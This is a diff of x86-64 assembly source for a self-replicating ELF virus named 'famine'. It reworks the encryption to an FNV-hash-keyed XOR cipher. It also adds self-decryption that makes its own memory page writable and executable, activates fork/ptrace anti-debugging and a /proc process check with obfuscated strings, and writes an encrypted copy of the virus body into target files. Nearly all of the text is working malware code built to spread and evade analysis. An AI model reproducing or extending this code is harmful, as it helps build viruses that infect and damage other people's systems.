@@ -8,16 +8,20 @@ section .text
 _famine:
     PUSH
     mov rbp, rsp        ; 48 89 e5     mov %rsp,%rbp
+    lea rsi, [rel obfu]
+    cmp byte [rsi], 0x50
+    jne decrypt
     jmp obfu
 
-; This need 16 bytes on rsp
-; use r8, r9
-; r8 = number;
-; r9 = counter
+;-------------------------------------------------------------
+; PARAMS = rdi = KEY
+; store in [RSP] key in string
+;-------------------------------------------------------------
 key_to_string:
+    xor rcx, rcx
     jmp .cond
     .number:
-        mov rax, r8
+        mov rax, rdi
         and eax, 15     ; 16 -- 0xf
         cmp al, 9
         jl .iter
@@ -27,232 +31,27 @@ key_to_string:
         .iter:
             add eax, 48
         .shift:
-            mov byte [rsp + 8 + r9], al
-            mov rax, r8
+            mov byte [rsp + 8 + rcx], al
+            mov rax, rdi
             shr rax, 4
-            mov r8, rax
-            add r9, 1
+            mov rdi, rax
+            add rcx, 1
         .cond:
-            cmp r8, 9
+            cmp rdi, 9
             ja .number
-    mov byte [rsp + 8 + r9], 0x0
-    ret
-; Need to rewrite RC4 ........
-_rc4:
-    push rbp
-    mov rbp, rsp
-    sub rsp, 304
-    lea rax, [rbp - 272]
-	mov	qword [rbp - 280], rdi
-	mov	qword [rbp - 288], rsi
-	mov	dword [rbp - 292], edx
-    mov	rdi, qword [rbp - 280]
-	mov	rsi, rax
-	call	KSA
-	lea	rdi, [rbp - 272]
-	mov	rsi, qword [rbp - 288]
-	mov	edx, dword [rbp - 292]
-    call	PRGA
-    add rsp, 304
-    pop rbp       
+    mov byte [rsp + 8 + rcx], 0x0
     ret
 
-KSA:
-    push rbp
-    mov rbp, rsp
-    sub rsp, 48 ; Maybe
-    mov qword [rbp - 8], rdi   ; KEY
-    mov qword [rbp - 16], rsi  ; STRING
-    mov rdi, qword [rbp - 8]   ; KEY in rdi
-    sub ecx, ecx
-    sub al, al
-    not ecx
-    cld
-    repne scasb
-    not ecx
-    dec ecx
-
-    mov dword [rbp - 24], ecx ; LEN
-    mov dword [rbp - 28], 0   ; init i = 0
-
-KSA_LOOP:
-    cmp dword [rbp - 28], 255
-    jge KSA_LOOP_LEAVE
-    mov eax, dword [rbp - 28]
-    mov cl, al
-    mov rdx, qword [rbp - 16]
-    movsxd rsi, dword [rbp - 28]
-    mov byte [rdx + rsi], cl
-    mov eax, dword [rbp - 28]
-    add eax, 1
-    mov dword [rbp - 28], eax
-    jmp KSA_LOOP
-
-KSA_LOOP_LEAVE:
-    mov dword [rbp - 20], 0   ; j =0
-    mov dword [rbp - 32], 0   ; i = 0
-
-
-KSA_LOOP_2:
-    cmp dword [rbp - 32], 255
-    jge KSA_END
-    mov eax, dword [rbp - 20] 
-    mov rcx, qword [rbp - 16]     
-    movsxd rdx, dword [rbp - 32], 
-    movzx esi, byte [rcx + rdx]    
-    add eax, esi
-    mov rcx, qword [rbp - 8]
-    mov esi, dword [rbp - 32]
-    mov dword [rbp - 36], eax
-    mov eax, esi
-    cdq
-    idiv dword [rbp - 24]
-    movsxd rdi, edx
-    movsx edx, byte [rcx + rdi]
-    mov esi, dword [rbp - 36]
-    add esi, edx
-    mov eax, esi
-    cdq
-    mov esi, 255
-    idiv esi
-    mov dword [rbp - 20], edx
-    mov rcx, qword [rbp - 16]
-    movsxd rdi, dword [rbp - 32]
-    add rcx, rdi
-    mov rdi, qword [rbp - 16]
-    movsxd r8, dword [rbp - 20]
-    add rdi, r8
-    mov qword [rbp - 48], rdi
-    mov rdi, rcx
-    mov rsi, qword [rbp - 48]
-    call swap
-
-    mov eax, dword [rbp - 32]
-    add eax, 1
-    mov dword [rbp - 32], eax
-    jmp KSA_LOOP_2
-
-KSA_END:
-    add rsp, 48
-    pop rbp
-    ret
-
-PRGA:
-    push rbp
-    mov rbp, rsp
-    sub rsp, 48
-
-    mov	qword [rbp - 8], rdi
-	mov	qword [rbp - 16], rsi
-	mov	dword [rbp - 20], edx
-	mov	dword [rbp - 24], 0
-	mov	dword [rbp - 28], 0
-	mov	dword [rbp - 32], 0
-	mov	qword [rbp - 40], 0
-
-PRGA_LOOP:
-    mov	rax, qword [rbp - 40]
-	mov	ecx, dword [rbp - 20]
-	mov	edx, ecx
-	cmp	rax, rdx
-	jae	PRGA_LOOP_END
-
-    ; in loop
-    mov	eax, dword [rbp - 24]
-	add	eax, 1
-	cdq
-	mov	ecx, 255
-	idiv	ecx
-	mov	dword [rbp - 24], edx
-	mov	edx, dword [rbp - 28]
-	mov	rsi, qword [rbp - 8]
-	movsxd	rdi, dword [rbp - 24]
-	movzx	r8d, byte [rsi + rdi]
-	add	edx, r8d
-	mov	eax, edx
-	cdq
-	idiv	ecx
-	mov	dword [rbp - 28], edx
-	mov	rsi, qword [rbp - 8]
-	movsxd	rdi, dword [rbp - 24]
-	add	rsi, rdi
-	mov	rdi, qword [rbp - 8]
-	movsxd	r9, dword [rbp - 28]
-	add	rdi, r9
-	mov	qword [rbp - 48], rdi
-	mov	rdi, rsi
-	mov	rsi, qword [rbp - 48]
-	call	swap
-	mov	rsi, qword [rbp - 8]
-	mov	rdi, qword [rbp - 8]
-	movsxd	r9, dword [rbp - 24]
-	movzx	ecx, byte [rdi + r9]
-	mov	rdi, qword [rbp - 8]
-	movsxd	r9, dword [rbp - 28]
-	movzx	edx, byte [rdi + r9]
-	add	ecx, edx
-	mov	eax, ecx
-	cdq
-	mov	ecx, 255
-	idiv	ecx
-	movsxd	rdi, edx
-	movzx	ecx, byte [rsi + rdi]
-	mov	dword [rbp - 32], ecx
-	mov	ecx, dword [rbp - 32]
-	mov	rsi, qword [rbp - 16]
-	mov	rdi, qword [rbp - 40]
-	movzx	edx, byte [rsi + rdi]
-	xor	ecx, edx
-	mov	r10b, cl
-	mov	rsi, qword [rbp - 16]
-	mov	rdi, qword [rbp - 40]
-	mov	byte [rsi + rdi], r10b
-
-    mov	rax, qword [rbp - 40]
-	add	rax, 1
-	mov	qword [rbp - 40], rax
-	jmp	PRGA_LOOP
-
-PRGA_LOOP_END:
-    add	rsp, 48
-	pop	rbp
-	ret
-
-swap:
-    push rbp
-    mov rbp, rsp
-	mov	qword [rbp - 8], rdi
-	mov	qword [rbp - 16], rsi
-	mov	rsi, qword [rbp - 8]
-	movzx	eax, byte [rsi]
-	mov	dword [rbp - 20], eax
-	mov	rsi, qword [rbp - 8]
-	mov	cl, byte [rsi]
-	mov	rsi, qword [rbp - 16]
-	mov	byte [rsi], cl
-	mov	eax, dword [rbp - 20]
-	mov	cl, al
-	mov	rsi, qword [rbp - 8]
-	mov	byte [rsi], cl
-	pop	rbp
-	ret
-
-; The key can be to length 256 and it should be the sum of every instructions
+; The key can be to length 16 and it should be the sum of every instructions
 ; https://eli.thegreenplace.net/2011/01/27/how-debuggers-work-part-2-breakpoints <-- god tiers
 
-; ENCRYPT FUNCTION
-; RDI = key
-; RSI = string start = RIP
-; RSX = string length = Next label - RIP
-; 1) Generate HASH from Bytes of next BLOCK.
-; 2) Hash = KEY for rc4
-; 3) Encrypt data with KEY.
 
-; rdi = str
-; rdx = len
+;-------------------------------------------------------------
+; PARAMS => rdi = addr, rdx = size
+; Generate a hash with FROM addr to addr + size 
+; Hash in RAX
+;-------------------------------------------------------------
 fnv:
-    push rbp
-    mov rbp, rsp
     sub rsp, 16
     mov rax, FNV_PRIME_64
     mov qword [rsp], rax
@@ -261,8 +60,8 @@ fnv:
     mov rsi, rdi
     mov rcx, rdx
     .loop:
-        movzx eax, byte [rsi] ; ?
-        movsx rax, al         ; ?
+        movzx eax, byte [rsi]
+        movsx rax, al
         add rsi, 1
         xor [rsp + 8], rax
         mov rdx, [rsp + 8]
@@ -273,27 +72,65 @@ fnv:
         cmp rcx, 0
         jne .loop
     mov rax, [rsp + 8]
-    leave
+    add rsp, 16
     ret
 
-; encrypt:
-;     lea rdi, [rel obfu]
-;     mov rdx, (ahahahaha - obfu)
-;     call fnv ; RAX contains HASH (KEY)
+;-------------------------------------------------------------
+; Params = rdi = addr, rsi = key(hash), rdx = addr len, rcx = keylen
+; Encrypt data using key
+;-------------------------------------------------------------
+XORCipher:
+    sub rsp, 16
+    mov [rsp], ecx
+    mov [rsp + 4], edx
+    mov qword [rsp + 8], 0
+    .xor_loop:
+        xor rdx, rdx
+        mov rax, [rsp + 8]
+        div dword [rsp] ; edx = %
+        mov rax, rsi
+        add rax, rdx
+        movzx edx, byte [rax]
+        mov rcx, rdi
+        add rcx, [rsp + 8]
+        movzx ecx, byte [rcx]
+        xor edx, ecx
+        mov rax, [rsp + 8]
+        lea rcx, [rdi + rax]
+        mov byte [rcx], dl
+        mov rax, [rsp + 8]
+        add rax, 1
+        mov [rsp + 8], rax
+        cmp eax, [rsp + 4]
+        jb .xor_loop
+    add rsp, 16
+    ret
 
-; decrypt:
-    ; mov rax, [rel obfu]
-    ; cmp al, 0x50
-    ; je obfu
-    ; add rax, 1
-    ; cmp al, 0x51
-    ; je obfu
-
-    ; lea rdi, [rel _famine]
-    ; mov rdx, CHUNKS_SIZE
-    ; call fnv
-    ; sub rsp, 40
-
+;-------------------------------------------------------------
+; Decryption methods, we're writing on our own code mprotect
+; is needed, if there is some sort of breakpoints or anything
+; in memory the hash will be false and result in segfault
+;-------------------------------------------------------------
+decrypt:
+    lea rdi, [rel obfu]
+    and rdi, 0xFFFFFFFFFFFFF000 ; align to lower pagesize
+    mov rsi, 0x1000
+    mov rdx, 7  ; int prot PROT_READ|PROT_WRITE|PROT_EXEC
+    mov rax, 10 ; mprotect
+    syscall
+    lea rdi, [rel _famine]
+    mov rdx, (FAMINE_SIZE - (CHUNKS_SIZE))
+    call fnv            ; key in rax
+    mov rdi, rax
+    sub rsp, 32
+    call key_to_string ; key in rsp, rcx = length
+    lea rsi, [rsp]
+    add rsp, 32
+    lea rdi, [rel obfu]
+    mov rdx, CHUNKS_SIZE
+; rdi = addr, rsi, = key, rdx = addr len, rcx = key len
+    call XORCipher
+    jmp obfu
 
 ;-------------------------------------------------------------
 ;----------------------->OBFUSCATION<-------------------------
@@ -402,133 +239,132 @@ begin:
     pop rax
     sub rsp, FILE_SIZE + DIRENT + FSTAT + ENTRY + MAPPED_FILE
 
-; ; ANTI DEBUG 2
+; ANTI DEBUG 2
     rdtsc                           ; get timestamp (EDX(high) - EAX(low))
     mov dword [rsp + 124], eax 
 
 ;-------------------------------------------------------------
 ; Fork and check if we're the tracers
 ;-------------------------------------------------------------
+next:
+    ; fork
+    mov rax, 57
+    syscall
+    cmp rax, 0
+    je child
 
-; next:
-;     ; fork
-;     mov rax, 57
-;     syscall
-;     cmp rax, 0
-;     je child
-; ;-------------------------------------------------------------
-; ; Parent wait for status from child
-; ; if WEXITSTATUS == 1, that's mean we're not the tracer
-; ;-------------------------------------------------------------
-
-;     mov rdi, rax
-;     lea rax, [rsp]
-;     mov rsi, rax
-;     mov rdx, 0
-;     mov r10, 0
-;     mov rax, 61
-;     syscall
-;     mov eax, dword [rsp]
-;     and eax, 65280
-;     sar eax, 8
-;     cmp eax, 1
-;     jne anti_process
-
-; ; -------------------------------------------------------------
-; ; This will print a msg and exit when debugging.
-; ; We're obfuscating code and literal string with MMX,
-; ; here we add two values to get what we want like this :
-; ; 44 45  42 55 47 47 49 4e 47 2e 2e 0a = "DEBUGGING..\n"
-; ; 24 19  22 1f 0c 2a 48 3a 0e 1e 05 01
-; ; 20 2c  20 36 3b 1d 01 14 39 10 29 09
-; ; -------------------------------------------------------------
-;     mov rcx, 0x42422a0c1f221924
-;     movq mm0, rcx
-;     mov rcx, 0x42421d3b36202c20
-;     movq mm1, rcx
-;     paddusb mm0, mm1
-;     movq rcx, mm0
-;     emms                        ; clear mmx
-;     shl rcx, 0x10
-;     shr rcx, 0x10
-;     mov [rsp], rcx
-
-;     mov rcx, 0x424201051e0e3a48
-;     movq mm2, rcx
-;     mov rcx, 0x4242092910391401
-;     movq mm3, rcx
-;     paddusb mm2, mm3
-;     movq rcx, mm2
-;     emms                        ; clear mmx
-; ; Here we need to remove the 0x4242 \O/.
-;     shl rcx, 0x10
-;     shr rcx, 0x10
-;     mov [rsp + 6], rcx
-;     xor rdi, rdi
-;     inc rdi
-;     lea rsi, [rsp]
-;     mov rdx, 13
-;     mov rax, SYS_WRITE
-;     syscall
-;     mov rax, SYS_EXIT
-;     mov rdi, 1
-;     syscall
-
-; ;-------------------------------------------------------------
-; ; Child code
-; ;-------------------------------------------------------------
-; child:
-; ; ptrace(PTRACE_ATTACH, ppid, 0 0);
-; ; if attach is successful the traced process has to be continued
-;     mov rax, 110
-;     syscall
-;     mov rdi, 16
-;     mov rsi, rax
-;     mov rdx, 0
-;     mov r10, 0
-;     mov rax, SYS_PTRACE
-;     syscall
-;     test rax, rax
-;     jns child_wait
-; ; We're not the tracee exit
-;     mov rdi, 1
-;     mov rax, SYS_EXIT
-;     syscall
-; ; Resume the traced process
-; child_wait:
-;     mov rax, 110
-;     syscall
-; ; waitpid(ppid, 0, 0)
-;     mov rdi, rax
-;     mov rsi, 0
-;     mov rdx, 0
-;     mov r10, 0
-;     mov rax, 61
-;     syscall
-; ; ptrace(PTRACE_CONT, ppid, 0, 0)
-;     mov rdi, 7
-;     xor rsi, rsi
-;     xor rdx, rdx
-;     xor r10, r10
-;     mov rax, SYS_PTRACE
-;     syscall
-;     mov rax, 110
-;     syscall
-; ; ptrace(PTRACE_DETACH, ppid, 0, 0)
-;     mov rdi, 17
-;     mov rsi, rax
-;     xor rdx, rdx
-;     xor r10, r10
-;     mov rax, SYS_PTRACE
-;     syscall
-; ; child exit
-;     mov rdi, 0
-;     mov rax, SYS_EXIT
-;     syscall
 ;-------------------------------------------------------------
+; Parent wait for status from child
+; if WEXITSTATUS == 1, that's mean we're not the tracer
+;------------------------------------------------------------
+    mov rdi, rax
+    lea rax, [rsp]
+    mov rsi, rax
+    mov rdx, 0
+    mov r10, 0
+    mov rax, 61
+    syscall
+    mov eax, dword [rsp]
+    and eax, 65280
+    sar eax, 8
+    cmp eax, 1
+    jne anti_process
+
+; -------------------------------------------------------------
+; This will print a msg and exit when debugging.
+; We're obfuscating code and literal string with MMX,
+; here we add two values to get what we want like this :
+; 44 45  42 55 47 47 49 4e 47 2e 2e 0a = "DEBUGGING..\n"
+; 24 19  22 1f 0c 2a 48 3a 0e 1e 05 01
+; 20 2c  20 36 3b 1d 01 14 39 10 29 09
+; -------------------------------------------------------------
+    mov rcx, 0x42422a0c1f221924
+    movq mm0, rcx
+    mov rcx, 0x42421d3b36202c20
+    movq mm1, rcx
+    paddusb mm0, mm1
+    movq rcx, mm0
+    emms                        ; clear mmx
+    shl rcx, 0x10
+    shr rcx, 0x10
+    mov [rsp], rcx
+
+    mov rcx, 0x424201051e0e3a48
+    movq mm2, rcx
+    mov rcx, 0x4242092910391401
+    movq mm3, rcx
+    paddusb mm2, mm3
+    movq rcx, mm2
+    emms                        ; clear mmx
+; Here we need to remove the 0x4242 \O/.
+    shl rcx, 0x10
+    shr rcx, 0x10
+    mov [rsp + 6], rcx
+    xor rdi, rdi
+    inc rdi
+    lea rsi, [rsp]
+    mov rdx, 13
+    mov rax, SYS_WRITE
+    syscall
+    mov rax, SYS_EXIT
+    mov rdi, 1
+    syscall
+
+;-------------------------------------------------------------
+; Child code
+;-------------------------------------------------------------
+child:
+; ptrace(PTRACE_ATTACH, ppid, 0 0);
+; if attach is successful the traced process has to be continued
+    mov rax, 110
+    syscall
+    mov rdi, 16
+    mov rsi, rax
+    mov rdx, 0
+    mov r10, 0
+    mov rax, SYS_PTRACE
+    syscall
+    test rax, rax
+    jns child_wait
+; We're not the tracee exit
+    mov rdi, 1
+    mov rax, SYS_EXIT
+    syscall
+; Resume the traced process
+child_wait:
+    mov rax, 110
+    syscall
+; waitpid(ppid, 0, 0)
+    mov rdi, rax
+    mov rsi, 0
+    mov rdx, 0
+    mov r10, 0
+    mov rax, 61
+    syscall
+; ptrace(PTRACE_CONT, ppid, 0, 0)
+    mov rdi, 7
+    xor rsi, rsi
+    xor rdx, rdx
+    xor r10, r10
+    mov rax, SYS_PTRACE
+    syscall
+    mov rax, 110
+    syscall
+; ptrace(PTRACE_DETACH, ppid, 0, 0)
+    mov rdi, 17
+    mov rsi, rax
+    xor rdx, rdx
+    xor r10, r10
+    mov rax, SYS_PTRACE
+    syscall
+; child exit
+    mov rdi, 0
+    mov rax, SYS_EXIT
+    syscall
+; -------------------------------------------------------------
 ; Search in `/proc/` dir a process with name `test` in
 ; the cmdline file.
-;-------------------------------------------------------------
+; -------------------------------------------------------------
 anti_process:
 ; little obfuscation to prevent literal strings in analysis
     mov rcx, 0x252345603525
@@ -903,41 +739,36 @@ mimic:
     mov r8, rax
 ;write header
     write r8, [rbp - 16], 64
-;encryption
+;-------------------------------------------------------------
+; Encryption
+;-------------------------------------------------------------
     lea rdi, [rel _famine]
-    mov rdx, FAMINE_SIZE
+    mov rdx, (FAMINE_SIZE) - (CHUNKS_SIZE)
     call fnv ; res in RAX
     sub rsp, FAMINE_SIZE
     mov rcx, FAMINE_SIZE
+
+    ; Maybe this doesnt word for the rep movsb.?.?
     lea rsi, [rel _famine]
     mov rdi, rsp
     rep movsb ; copy to stack
 ; Key to string for RC4
-    push r8
-    push r9
+    mov rdi, rax
     sub rsp, 32
-    xor r9, r9
-    mov r8, rax
     call key_to_string
-    lea rdi, [rsp]  ; key
-    mov rdx, r9     ; count
+    lea rsi, [rsp]  ; key
     add rsp, 32
-    pop r9
-    pop r8
 
-blop:
-    mov rcx, FAMINE_SIZE
-    sub rcx, CHUNKS_SIZE
-    lea rsi, [rsp]
-    add rsi, rcx
-    mov rdx, FAMINE_SIZE
-    call _rc4
-;write viruses
-    ; write_rel r8, [rsp], FAMINE_SIZE
-    ; write_rel r8, [rel _famine], FAMINE_SIZE
-    write_rel r8, [rel _famine], FAMINE_SIZE
+; rdx = key
+; rbx = key length
+    mov rdx, CHUNKS_SIZE
+    lea rdi, [rsp + (FAMINE_SIZE) - (CHUNKS_SIZE)]      ; File start data to encrypt
+    call XORCipher
+;-------------------------------------------------------------
+; Write virus
+;-------------------------------------------------------------
+    write_rel r8, [rsp], FAMINE_SIZE
     add rsp, FAMINE_SIZE
-    ; sub rsp, FAMINE_SIZE + 16
 
 
 ;-------------------------------------------------------------
